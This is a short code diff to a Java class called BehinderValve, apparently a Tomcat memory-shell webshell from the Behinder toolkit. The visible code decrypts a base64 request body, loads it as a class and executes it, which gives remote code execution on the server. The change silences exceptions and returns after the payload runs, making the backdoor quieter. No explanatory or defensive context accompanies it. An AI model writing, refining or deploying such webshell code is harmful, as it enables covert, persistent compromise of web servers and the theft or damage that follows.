@@ -92,13 +92,11 @@ public class BehinderValve extends ClassLoader implements Valve {
                 byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
                 Object instance = (new BehinderValve(this.getClass().getClassLoader())).g(bytes).newInstance();
                 instance.equals(obj);
-            } else {
-                this.getNext().invoke(request, response);
+                return;
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-            this.getNext().invoke(request, response);
+        } catch (Exception ignored) {
         }
+        this.getNext().invoke(request, response);
     }
 
     public HttpServletResponse getInternalResponse(HttpServletResponse response) {
